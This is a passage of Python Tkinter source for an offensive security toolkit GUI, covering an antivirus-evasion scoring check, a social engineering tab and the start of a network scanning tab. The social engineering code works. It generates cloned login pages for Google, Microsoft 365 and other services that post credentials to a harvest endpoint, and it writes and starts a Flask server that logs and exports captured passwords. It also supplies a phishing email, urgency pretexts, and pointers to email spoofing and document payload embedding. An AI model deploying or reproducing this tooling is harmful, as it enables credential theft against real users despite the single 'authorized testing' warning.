            ("Heuristic analysis", lambda: len(output) > 100),
            ("Entropy analysis", lambda: True),  # Always pass for demo
            ("String patterns", lambda: not re.search(r'\b(cmd|exec|eval)\b', output)),
        ]
        
        passed = 0
        for name, check in checks:
            result = check()
            status = "✓ PASS" if result else "✗ FAIL"
            self.obf_console.insert(tk.END, f"  {status} - {name}\n")
            if result:
                passed += 1
        
        score = (passed / len(checks)) * 100
        self.obf_console.insert(tk.END, f"\n  Evasion Score: {score:.0f}%\n")
        
        if score >= 75:
            self.obf_console.insert(tk.END, "  [+] Good evasion potential\n")
        else:
            self.obf_console.insert(tk.END, "  [!] Consider additional obfuscation\n")
    
    def show_entropy_graph(self):
        """Show entropy visualization"""
        messagebox.showinfo("Entropy Graph", "Entropy visualization requires matplotlib.\nCurrent entropy shown in stats panel.")
    
    # Social Engineering Toolkit
    def create_social_engineering_tab(self):
        """Social engineering tools for phishing and credential harvesting"""
        se_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(se_frame, text="🎭 Social Engineering")
        
        # Make SE content scrollable
        se_scroll_container, _, se_inner = self._make_scrollable(se_frame)
        se_scroll_container.pack(fill=tk.BOTH, expand=True)
        
        # Top section: Campaign type selection
        campaign_frame = tk.LabelFrame(se_inner, text="Campaign Type", padding=10)
        campaign_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.se_campaign_type = tk.StringVar(value="phishing")
        
        campaign_types = [
            ("phishing", "🎣 Phishing Page", "Clone login pages"),
            ("credential", "🔑 Credential Harvester", "Capture credentials"),
            ("usb_drop", "💾 USB Drop", "Autorun payloads"),
            ("qr_code", "📱 QR Code Phishing", "QR code attacks"),
            ("pretexting", "📞 Pretexting", "Social pretexts"),
        ]
        
        for value, label, desc in campaign_types:
            rb_frame = tk.Frame(campaign_frame)
            rb_frame.pack(side=tk.LEFT, padx=10)
            
            tk.Radiobutton(rb_frame, text=label, variable=self.se_campaign_type, 
                          value=value, command=self.update_se_options).pack(anchor=tk.W)
            tk.Label(rb_frame, text=desc, font=("Arial", 8), foreground="#888888").pack(anchor=tk.W)
        
        # Main split panel
        main_split = tk.Frame(se_inner)
        main_split.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Left panel: Configuration
        left_panel = tk.Frame(main_split)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        # Target configuration
        target_frame = tk.LabelFrame(left_panel, text="Target Configuration", padding=10)
        target_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(target_frame, text="Target URL/Domain:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.se_target_url = tk.Entry(target_frame, font=("Courier", 9))
        self.se_target_url.insert(0, "https://example.com/login")
        self.se_target_url.grid(row=0, column=1, sticky=tk.EW, pady=5, padx=5)
        
        tk.Label(target_frame, text="Clone/Template:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.se_template = tk.Combobox(target_frame, state="readonly", values=[
            "Google Login", "Microsoft 365", "Facebook", "LinkedIn", "GitHub",
            "AWS Console", "Custom URL"
        ])
        self.se_template.current(0)
        self.se_template.grid(row=1, column=1, sticky=tk.EW, pady=5, padx=5)
        
        tk.Label(target_frame, text="Redirect URL:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.se_redirect = tk.Entry(target_frame, font=("Courier", 9))
        self.se_redirect.insert(0, "https://google.com")
        self.se_redirect.grid(row=2, column=1, sticky=tk.EW, pady=5, padx=5)
        
        target_frame.columnconfigure(1, weight=1)
        
        # Server configuration
        server_frame = tk.LabelFrame(left_panel, text="Phishing Server", padding=10)
        server_frame.pack(fill=tk.X, pady=(0, 10))
        
        server_grid = tk.Frame(server_frame)
        server_grid.pack(fill=tk.X)
        
        tk.Label(server_grid, text="Listen Port:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.se_port = tk.Entry(server_grid, width=10)
        self.se_port.insert(0, "8080")
        self.se_port.grid(row=0, column=1, sticky=tk.W, pady=2, padx=5)
        
        tk.Label(server_grid, text="SSL/TLS:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.se_ssl_var = tk.IntVar(value=0)
        tk.Checkbutton(server_grid, text="Enable HTTPS", variable=self.se_ssl_var).grid(row=1, column=1, sticky=tk.W, pady=2, padx=5)
        
        tk.Label(server_grid, text="Log File:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.se_log_file = tk.Entry(server_grid, width=25)
        self.se_log_file.insert(0, "credentials.log")
        self.se_log_file.grid(row=2, column=1, sticky=tk.EW, pady=2, padx=5)
        
        server_grid.columnconfigure(1, weight=1)
        
        server_btns = tk.Frame(server_frame)
        server_btns.pack(fill=tk.X, pady=(10, 0))
        
        self.se_server_btn = tk.Button(server_btns, text="🚀 Start Server", 
                                       command=self.start_phishing_server, style="Action.TButton")
        self.se_server_btn.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        tk.Button(server_btns, text="⏹️ Stop Server", command=self.stop_phishing_server).pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Email template
        email_frame = tk.LabelFrame(left_panel, text="Email Template", padding=10)
        email_frame.pack(fill=tk.BOTH, expand=True)
        
        email_toolbar = tk.Frame(email_frame)
        email_toolbar.pack(fill=tk.X, pady=(0, 5))
        
        tk.Button(email_toolbar, text="📧 Load Template", command=self.load_email_template).pack(side=tk.LEFT, padx=2)
        tk.Button(email_toolbar, text="💾 Save", command=self.save_email_template).pack(side=tk.LEFT, padx=2)
        tk.Button(email_toolbar, text="📤 Send Test", command=self.send_test_email).pack(side=tk.LEFT, padx=2)
        
        self.se_email_text = scrolledtext.ScrolledText(email_frame, height=10, font=("Arial", 9),
                                                       bg="#1a1a1a", fg="#ffffff", wrap=tk.WORD)
        self.se_email_text.pack(fill=tk.BOTH, expand=True)
        
        # Default template
        default_email = """Subject: Important Security Update Required

Dear User,

We've detected unusual activity on your account. Please verify your identity by clicking the link below:

{{PHISHING_LINK}}

This link will expire in 24 hours.

Best regards,
Security Team"""
        self.se_email_text.insert("1.0", default_email)
        
        # Right panel: Preview & captured data
        right_panel = tk.Frame(main_split)
        right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Preview/HTML
        preview_frame = tk.LabelFrame(right_panel, text="Page Preview / HTML", padding=10)
        preview_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        preview_toolbar = tk.Frame(preview_frame)
        preview_toolbar.pack(fill=tk.X, pady=(0, 5))
        
        tk.Button(preview_toolbar, text="🔄 Generate", command=self.generate_phishing_page).pack(side=tk.LEFT, padx=2)
        tk.Button(preview_toolbar, text="🌐 Preview", command=self.preview_phishing_page).pack(side=tk.LEFT, padx=2)
        tk.Button(preview_toolbar, text="💾 Export", command=self.export_phishing_page).pack(side=tk.LEFT, padx=2)
        
        self.se_html_text = scrolledtext.ScrolledText(preview_frame, height=12, font=("Courier", 8),
                                                      bg="#0a0a0a", fg="#00ff00", wrap=tk.WORD)
        self.se_html_text.pack(fill=tk.BOTH, expand=True)
        
        # Captured credentials
        captured_frame = tk.LabelFrame(right_panel, text="Captured Credentials", padding=10)
        captured_frame.pack(fill=tk.BOTH, expand=True)
        
        captured_toolbar = tk.Frame(captured_frame)
        captured_toolbar.pack(fill=tk.X, pady=(0, 5))
        
        tk.Button(captured_toolbar, text="🔄 Refresh", command=self.refresh_captured_creds).pack(side=tk.LEFT, padx=2)
        tk.Button(captured_toolbar, text="💾 Export", command=self.export_captured_creds).pack(side=tk.LEFT, padx=2)
        tk.Button(captured_toolbar, text="🗑️ Clear", command=self.clear_captured_creds).pack(side=tk.LEFT, padx=2)
        
        # Credentials listbox
        creds_list_frame = tk.Frame(captured_frame)
        creds_list_frame.pack(fill=tk.BOTH, expand=True)
        
        self.se_creds_list = Listbox(creds_list_frame, font=("Courier", 8), height=8)
        self.se_creds_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar = tk.Scrollbar(creds_list_frame, orient=tk.VERTICAL, command=self.se_creds_list.yview)
        self.se_creds_list.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Bottom: Tools & output
        tools_frame = tk.Frame(se_inner)
        tools_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(tools_frame, text="Quick Tools:", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
        
        tk.Button(tools_frame, text="🔗 URL Shortener", command=self.open_url_shortener).pack(side=tk.LEFT, padx=2)
        tk.Button(tools_frame, text="📱 QR Generator", command=self.generate_qr_code).pack(side=tk.LEFT, padx=2)
        tk.Button(tools_frame, text="📧 Email Spoofer", command=self.open_email_spoofer).pack(side=tk.LEFT, padx=2)
        tk.Button(tools_frame, text="📄 Document Embedder", command=self.open_doc_embedder).pack(side=tk.LEFT, padx=2)
        tk.Button(tools_frame, text="🎭 Pretext Generator", command=self.open_pretext_generator).pack(side=tk.LEFT, padx=2)
        
        # Output console
        console_frame = tk.LabelFrame(se_inner, text="Campaign Log", padding=10)
        console_frame.pack(fill=tk.BOTH, expand=True)
        
        self.se_console = scrolledtext.ScrolledText(console_frame, height=6, bg="#0a0a0a", fg="#00ff00",
                                                    font=("Courier", 9), insertbackground="#00ff00", wrap=tk.WORD)
        self.se_console.pack(fill=tk.BOTH, expand=True)
        
        # SE state
        self.se_server_running = False
        self.se_server_process = None
        self.se_captured_creds = []
        
        self.se_console.insert(tk.END, "Social Engineering Toolkit initialized\n")
        self.se_console.insert(tk.END, "WARNING: Use only for authorized security testing\n\n")
    
    def update_se_options(self):
        """Update options based on campaign type"""
        campaign = self.se_campaign_type.get()
        self.se_console.insert(tk.END, f"Campaign type: {campaign}\n")
    
    def generate_phishing_page(self):
        """Generate phishing page HTML"""
        template = self.se_template.get()
        redirect = self.se_redirect.get()
        
        self.se_console.insert(tk.END, f"\n[+] Generating phishing page for {template}...\n")
        
        # Generate basic phishing HTML
        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - {template}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }}
        .login-container {{
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 400px;
        }}
        h2 {{ text-align: center; color: #333; }}
        input {{
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }}
        button {{
            width: 100%;
            padding: 12px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }}
        button:hover {{ background: #45a049; }}
        .error {{ color: red; text-align: center; margin-top: 10px; }}
    </style>
</head>
<body>
    <div class="login-container">
        <h2>{template}</h2>
        <form id="loginForm" method="POST" action="/harvest">
            <input type="email" name="username" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div id="error" class="error"></div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            // Send credentials
            fetch('/harvest', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    username: this.username.value,
                    password: this.password.value,
                    timestamp: new Date().toISOString()
                }})
            }}).then(() => {{
                // Redirect after capture
                window.location.href = '{redirect}';
            }});
        }});
    </script>
</body>
</html>'''
        
        self.se_html_text.delete("1.0", tk.END)
        self.se_html_text.insert("1.0", html)
        
        self.se_console.insert(tk.END, "[+] Phishing page generated\n")
        self.se_console.insert(tk.END, f"[+] Redirects to: {redirect}\n")
    
    def preview_phishing_page(self):
        """Preview phishing page in browser"""
        html_content = self.se_html_text.get("1.0", tk.END)
        
        # Save to temp file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False) as f:
            f.write(html_content)
            temp_path = f.name
        
        webbrowser.open(f'file://{temp_path}')
        self.se_console.insert(tk.END, f"[+] Preview opened in browser\n")
    
    def export_phishing_page(self):
        """Export phishing page"""
        html_content = self.se_html_text.get("1.0", tk.END)
        
        filepath = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML Files", "*.html"), ("All Files", "*.*")]
        )
        
        if filepath:
            with open(filepath, 'w') as f:
                f.write(html_content)
            self.se_console.insert(tk.END, f"[+] Exported to: {filepath}\n")
            messagebox.showinfo("Exported", f"Phishing page saved to {filepath}")
    
    def start_phishing_server(self):
        """Start phishing credential harvester server"""
        if self.se_server_running:
            messagebox.showwarning("Server Running", "Server is already running")
            return
        
        port = self.se_port.get()
        log_file = self.se_log_file.get()
        
        self.se_console.insert(tk.END, f"\n[+] Starting phishing server on port {port}...\n")
        
        # Create simple Flask server script
        server_script = f'''#!/usr/bin/env python3
import flask
from flask import request, jsonify
import json
from datetime import datetime

app = flask.Flask(__name__)

@app.route('/')
def index():
    with open('phishing.html', 'r') as f:
        return f.read()

@app.route('/harvest', methods=['POST'])
def harvest():
    data = request.get_json()
    
    # Log credentials
    with open('{log_file}', 'a') as f:
        f.write(json.dumps(data) + '\\n')
    
    print(f"[CAPTURED] Username: {{data.get('username')}}, Password: {{data.get('password')}}")
    
    return jsonify({{"status": "success"}})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port={port}, debug=False)
'''
        
        # Save server script
        with open('phishing_server.py', 'w') as f:
            f.write(server_script)
        
        # Save HTML
        html_content = self.se_html_text.get("1.0", tk.END)
        with open('phishing.html', 'w') as f:
            f.write(html_content)
        
        # Start server in background
        try:
            self.se_server_process = subprocess.Popen(
                [sys.executable, 'phishing_server.py'],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            self.se_server_running = True
            self.se_server_btn.config(text="✅ Server Running")
            
            self.se_console.insert(tk.END, f"[+] Server started on http://0.0.0.0:{port}\n")
            self.se_console.insert(tk.END, f"[+] Credentials will be logged to {log_file}\n")
            self.se_console.insert(tk.END, "[+] Share the URL with targets\n")
            
            messagebox.showinfo("Server Started", f"Phishing server running on port {port}")
            
        except Exception as e:
            self.se_console.insert(tk.END, f"[ERROR] Failed to start server: {e}\n")
            messagebox.showerror("Error", f"Failed to start server: {e}")
    
    def stop_phishing_server(self):
        """Stop phishing server"""
        if not self.se_server_running:
            messagebox.showwarning("No Server", "No server is running")
            return
        
        if self.se_server_process:
            self.se_server_process.terminate()
            self.se_server_process = None
        
        self.se_server_running = False
        self.se_server_btn.config(text="🚀 Start Server")
        
        self.se_console.insert(tk.END, "[+] Server stopped\n")
    
    def refresh_captured_creds(self):
        """Refresh captured credentials from log"""
        log_file = self.se_log_file.get()
        
        try:
            with open(log_file, 'r') as f:
                lines = f.readlines()
            
            self.se_creds_list.delete(0, tk.END)
            self.se_captured_creds = []
            
            for line in lines:
                try:
                    data = json.loads(line.strip())
                    cred_str = f"{data.get('timestamp', 'N/A')} | {data.get('username', 'N/A')} : {data.get('password', 'N/A')}"
                    self.se_creds_list.insert(tk.END, cred_str)
                    self.se_captured_creds.append(data)
                except:
                    pass
            
            self.se_console.insert(tk.END, f"[+] Loaded {len(self.se_captured_creds)} captured credential(s)\n")
            
        except FileNotFoundError:
            self.se_console.insert(tk.END, f"[!] Log file not found: {log_file}\n")
        except Exception as e:
            self.se_console.insert(tk.END, f"[ERROR] {e}\n")
    
    def export_captured_creds(self):
        """Export captured credentials"""
        if not self.se_captured_creds:
            messagebox.showwarning("No Data", "No credentials to export")
            return
        
        filepath = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON Files", "*.json"), ("CSV Files", "*.csv"), ("Text Files", "*.txt")]
        )
        
        if filepath:
            if filepath.endswith('.json'):
                with open(filepath, 'w') as f:
                    json.dump(self.se_captured_creds, f, indent=2)
            elif filepath.endswith('.csv'):
                import csv
                with open(filepath, 'w', newline='') as f:
                    if self.se_captured_creds:
                        writer = csv.DictWriter(f, fieldnames=self.se_captured_creds[0].keys())
                        writer.writeheader()
                        writer.writerows(self.se_captured_creds)
            else:
                with open(filepath, 'w') as f:
                    for cred in self.se_captured_creds:
                        f.write(json.dumps(cred) + '\n')
            
            self.se_console.insert(tk.END, f"[+] Exported to: {filepath}\n")
            messagebox.showinfo("Exported", f"Credentials saved to {filepath}")
    
    def clear_captured_creds(self):
        """Clear captured credentials"""
        if messagebox.askyesno("Clear Data", "Clear all captured credentials?"):
            self.se_creds_list.delete(0, tk.END)
            self.se_captured_creds = []
            
            log_file = self.se_log_file.get()
            try:
                open(log_file, 'w').close()
                self.se_console.insert(tk.END, "[+] Credentials cleared\n")
            except Exception as e:
                self.se_console.insert(tk.END, f"[ERROR] {e}\n")
    
    def load_email_template(self):
        """Load email template"""
        filepath = filedialog.askopenfilename(
            title="Select email template",
            filetypes=[("Text Files", "*.txt *.eml"), ("All Files", "*.*")]
        )
        if filepath:
            with open(filepath, 'r') as f:
                content = f.read()
            self.se_email_text.delete("1.0", tk.END)
            self.se_email_text.insert("1.0", content)
            self.se_console.insert(tk.END, f"Loaded template: {filepath}\n")
    
    def save_email_template(self):
        """Save email template"""
        content = self.se_email_text.get("1.0", tk.END)
        
        filepath = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        
        if filepath:
            with open(filepath, 'w') as f:
                f.write(content)
            self.se_console.insert(tk.END, f"Template saved: {filepath}\n")
    
    def send_test_email(self):
        """Send test phishing email"""
        email_content = self.se_email_text.get("1.0", tk.END)
        
        test_email = simpledialog.askstring("Test Email", "Enter test recipient email:")
        if test_email:
            self.se_console.insert(tk.END, f"\n[+] Sending test email to {test_email}...\n")
            self.se_console.insert(tk.END, "[!] Email sending requires SMTP configuration\n")
            self.se_console.insert(tk.END, "Tip: Use tools like swaks or sendemail\n")
    
    def open_url_shortener(self):
        """Open URL shortener dialog"""
        short_win = tk.Toplevel(self)
        short_win.title("URL Shortener")
        short_win.geometry("500x300")
        
        tk.Label(short_win, text="URL Shortener", font=("Arial", 12, "bold")).pack(pady=10)
        
        tk.Label(short_win, text="Original URL:").pack(anchor=tk.W, padx=20)
        url_entry = tk.Entry(short_win, width=50)
        url_entry.pack(padx=20, pady=5)
        
        tk.Label(short_win, text="Shortened URL:").pack(anchor=tk.W, padx=20, pady=(10, 0))
        short_entry = tk.Entry(short_win, width=50, state='readonly')
        short_entry.pack(padx=20, pady=5)
        
        def shorten():
            url = url_entry.get()
            if url:
                # Simulate shortening
                short_url = f"https://bit.ly/{hashlib.md5(url.encode()).hexdigest()[:8]}"
                short_entry.config(state='normal')
                short_entry.delete(0, tk.END)
                short_entry.insert(0, short_url)
                short_entry.config(state='readonly')
        
        tk.Button(short_win, text="Shorten", command=shorten).pack(pady=10)
        tk.Label(short_win, text="Note: Use services like bit.ly, tinyurl.com, or cutt.ly",
                font=("Arial", 8), foreground="#888888").pack(pady=5)
    
    def generate_qr_code(self):
        """Generate QR code for phishing URL"""
        url = self.se_target_url.get()
        
        messagebox.showinfo("QR Code", f"QR code generation for:\n{url}\n\nUse: qrencode -o qr.png '{url}'")
        self.se_console.insert(tk.END, f"QR code: qrencode -o qr.png '{url}'\n")
    
    def open_email_spoofer(self):
        """Open email spoofing dialog"""
        messagebox.showinfo("Email Spoofing", "Email spoofing tools:\n\n" +
                           "• swaks - Swiss Army Knife SMTP\n" +
                           "• sendemail - CLI email sender\n" +
                           "• Gophish - Phishing framework\n\n" +
                           "Configure SMTP settings for email campaigns")
    
    def open_doc_embedder(self):
        """Open document payload embedder"""
        messagebox.showinfo("Document Embedder", "Embed payloads in documents:\n\n" +
                           "• Office macros (VBA)\n" +
                           "• PDF JavaScript\n" +
                           "• LNK file exploits\n" +
                           "• ISO/ZIP archives\n\n" +
                           "Use responsibly for authorized testing only")
    
    def open_pretext_generator(self):
        """Open pretext generator"""
        pretext_win = tk.Toplevel(self)
        pretext_win.title("Pretext Generator")
        pretext_win.geometry("600x400")
        
        tk.Label(pretext_win, text="Social Engineering Pretext Generator", 
                font=("Arial", 12, "bold")).pack(pady=10)
        
        tk.Label(pretext_win, text="Scenario:").pack(anchor=tk.W, padx=20)
        scenario = tk.Combobox(pretext_win, state="readonly", values=[
            "IT Support Password Reset",
            "HR Benefits Update",
            "Executive Assistant Request",
            "Vendor Invoice",
            "Security Team Alert",
            "System Maintenance Notice"
        ], width=40)
        scenario.current(0)
        scenario.pack(padx=20, pady=5)
        
        tk.Label(pretext_win, text="Generated Pretext:").pack(anchor=tk.W, padx=20, pady=(10, 0))
        pretext_text = scrolledtext.ScrolledText(pretext_win, height=15, width=70)
        pretext_text.pack(padx=20, pady=5)
        
        def generate_pretext():
            selected = scenario.get()
            pretexts = {
                "IT Support Password Reset": "Your password will expire in 24 hours. Click here to reset: {{LINK}}",
                "HR Benefits Update": "Important benefits enrollment deadline. Review your options: {{LINK}}",
                "Executive Assistant Request": "CEO needs this completed urgently. Access the document: {{LINK}}",
                "Vendor Invoice": "Attached invoice #12345 requires immediate payment. View: {{LINK}}",
                "Security Team Alert": "Suspicious activity detected. Verify your account: {{LINK}}",
                "System Maintenance Notice": "Scheduled maintenance requires re-authentication: {{LINK}}"
            }
            pretext_text.delete("1.0", tk.END)
            pretext_text.insert("1.0", pretexts.get(selected, ""))
        
        tk.Button(pretext_win, text="Generate", command=generate_pretext).pack(pady=10)
    
    # Network Reconnaissance & Scanning
    def create_network_recon_tab(self):
        """Network reconnaissance and port scanning tools"""
        recon_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(recon_frame, text="🔍 Network Recon")
        
        # Top section: Scan type selection
        scan_type_frame = tk.LabelFrame(recon_frame, text="Scan Type", padding=10)
        scan_type_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.recon_scan_type = tk.StringVar(value="quick")
        
        scan_types = [
            ("quick", "⚡ Quick Scan", "Top 100 ports"),
            ("full", "📊 Full Scan", "All 65535 ports"),
            ("stealth", "🥷 Stealth", "SYN scan"),
            ("service", "🔍 Service Detection", "Version detection"),
            ("vuln", "🔥 Vulnerability", "NSE vuln scripts"),
        ]
        
        for value, label, desc in scan_types:
            rb_frame = tk.Frame(scan_type_frame)
            rb_frame.pack(side=tk.LEFT, padx=8)
            
            tk.Radiobutton(rb_frame, text=label, variable=self.recon_scan_type, value=value).pack(anchor=tk.W)
            tk.Label(rb_frame, text=desc, font=("Arial", 8), foreground="#888888").pack(anchor=tk.W)
        
        # Main split panel
        main_split = tk.Frame(recon_frame)
        main_split.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Left panel: Configuration and targets
        left_panel = tk.Frame(main_split)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        # Target configuration
        target_frame = tk.LabelFrame(left_panel, text="Target Configuration", padding=10)
        target_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(target_frame, text="Target(s):").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.recon_target = tk.Entry(target_frame, font=("Courier", 9))
        self.recon_target.insert(0, "192.168.1.0/24")
        self.recon_target.grid(row=0, column=1, sticky=tk.EW, pady=5, padx=5)
        
        tk.Label(target_frame, text="Ports:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.recon_ports = tk.Entry(target_frame, font=("Courier", 9))
        self.recon_ports.insert(0, "1-1000")
        self.recon_ports.grid(row=1, column=1, sticky=tk.EW, pady=5, padx=5)
        
        tk.Label(target_frame, text="Timing:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.recon_timing = tk.Combobox(target_frame, state="readonly", values=[
            "T0 - Paranoid", "T1 - Sneaky", "T2 - Polite", "T3 - Normal", "T4 - Aggressive", "T5 - Insane"
        ])
        self.recon_timing.current(3)
        self.recon_timing.grid(row=2, column=1, sticky=tk.EW, pady=5, padx=5)
        
        target_frame.columnconfigure(1, weight=1)
        
        # Scan options
        options_frame = tk.LabelFrame(left_panel, text="Scan Options", padding=10)
        options_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.recon_options = {}
        options = [
            ("os_detect", "OS Detection (-O)"),
            ("service_version", "Service Version (-sV)"),
            ("scripts", "Default Scripts (-sC)"),
            ("aggressive", "Aggressive Scan (-A)"),
            ("traceroute", "Traceroute (--traceroute)"),
            ("dns", "DNS Resolution (-n for skip)"),
        ]
        
        for i, (key, label) in enumerate(options):
            var = tk.IntVar(value=0)
            self.recon_options[key] = var
            tk.Checkbutton(options_frame, text=label, variable=var).grid(row=i//2, column=i%2, sticky=tk.W, padx=10, pady=2)
        
        # Quick discovery
        discovery_frame = tk.LabelFrame(left_panel, text="Quick Discovery", padding=10)
        discovery_frame.pack(fill=tk.BOTH, expand=True)
        
        discovery_btns = [
            ("🔍 Network Sweep", self.network_sweep),
            ("💻 Find Hosts", self.find_live_hosts),
            ("🛡️ Firewall Detect", self.detect_firewall),
            ("🌐 DNS Enum", self.dns_enumeration),
        ]
        
        for i, (name, cmd) in enumerate(discovery_btns):
            btn_frame = tk.Frame(discovery_frame, style="Card.TFrame", padding=8)
            btn_frame.pack(fill=tk.X, pady=3)
            
            tk.Label(btn_frame, text=name, font=("Arial", 9, "bold")).pack(side=tk.LEFT)
            tk.Button(btn_frame, text="Run", command=cmd, width=8).pack(side=tk.RIGHT)
        
        # Right panel: Results
        right_panel = tk.Frame(main_split)
        right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Discovered hosts
        hosts_frame = tk.LabelFrame(right_panel, text="Discovered Hosts", padding=10)
        hosts_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        hosts_toolbar = tk.Frame(hosts_frame)
        hosts_toolbar.pack(fill=tk.X, pady=(0, 5))
        
        tk.Button(hosts_toolbar, text="🔄 Refresh", command=self.refresh_hosts).pack(side=tk.LEFT, padx=2)
        tk.Button(hosts_toolbar, text="💾 Export", command=self.export_recon_results).pack(side=tk.LEFT, padx=2)
        tk.Button(hosts_toolbar, text="🎯 Select Target", command=self.select_host_target).pack(side=tk.LEFT, padx=2)
        
        hosts_list_frame = tk.Frame(hosts_frame)
        hosts_list_frame.pack(fill=tk.BOTH, expand=True)
        
        self.recon_hosts_list = Listbox(hosts_list_frame, font=("Courier", 8), height=10)
        self.recon_hosts_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar = tk.Scrollbar(hosts_list_frame, orient=tk.VERTICAL, command=self.recon_hosts_list.yview)
        self.recon_hosts_list.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Port scan results
        ports_frame = tk.LabelFrame(right_panel, text="Open Ports & Services", padding=10)
        ports_frame.pack(fill=tk.BOTH, expand=True)
        
        ports_toolbar = tk.Frame(ports_frame)
        ports_toolbar.pack(fill=tk.X, pady=(0, 5))
        
        tk.Button(ports_toolbar, text="🔍 Deep Scan", command=self.deep_scan_selected).pack(side=tk.LEFT, padx=2)
        tk.Button(ports_toolbar, text="📊 Visualize", command=self.visualize_network).pack(side=tk.LEFT, padx=2)
        
        ports_list_frame = tk.Frame(ports_frame)
        ports_list_frame.pack(fill=tk.BOTH, expand=True)
        
        self.recon_ports_list = Listbox(ports_list_frame, font=("Courier", 8), height=10)
        self.recon_ports_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar2 = tk.Scrollbar(ports_list_frame, orient=tk.VERTICAL, command=self.recon_ports_list.yview)
        self.recon_ports_list.configure(yscrollcommand=scrollbar2.set)
        scrollbar2.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Bottom: Action buttons and output
        action_frame = tk.Frame(recon_frame)
        action_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.recon_scan_btn = tk.Button(action_frame, text="🚀 Start Scan", 
                                        command=self.start_network_scan, style="Action.TButton")
        self.recon_scan_btn.pack(side=tk.LEFT, padx=5)
        
        tk.Button(action_frame, text="⏹️ Stop Scan", command=self.stop_network_scan).pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="📊 Generate Report", command=self.generate_scan_report).pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="🛠️ Tools", command=self.open_recon_tools).pack(side=tk.LEFT, padx=5)
        
        # Output console
        console_frame = tk.LabelFrame(recon_frame, text="Scan Output", padding=10)
        console_frame.pack(fill=tk.BOTH, expand=True)
        
        console_toolbar = tk.Frame(console_frame)
        console_toolbar.pack(fill=tk.X, pady=(0, 5))
        
        tk.Button(console_toolbar, text="💾 Save Log", command=self.save_recon_log).pack(side=tk.LEFT, padx=2)
        tk.Button(console_toolbar, text="🗑️ Clear", command=lambda: self.recon_console.delete("1.0", tk.END)).pack(side=tk.LEFT, padx=2)
        
        self.recon_console = scrolledtext.ScrolledText(console_frame, height=8, bg="#0a0a0a", fg="#00ff00",
                                                       font=("Courier", 9), insertbackground="#00ff00", wrap=tk.WORD)
        self.recon_console.pack(fill=tk.BOTH, expand=True)
        
        # Recon state
        self.recon_scan_running = False
        self.recon_scan_process = None
        self.recon_discovered_hosts = []
        self.recon_scan_results = {}
        
        self.recon_console.insert(tk.END, "Network Reconnaissance initialized\n")
        self.recon_console.insert(tk.END, "Ready to scan networks\n\n")
    
    def start_network_scan(self):
        """Start network reconnaissance scan"""
        if self.recon_scan_running:
            messagebox.showwarning("Scan Running", "A scan is already in progress")
            return
        
        target = self.recon_target.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Enter target IP/network")
            return
        
        # Check for nmap
        if not shutil.which("nmap"):
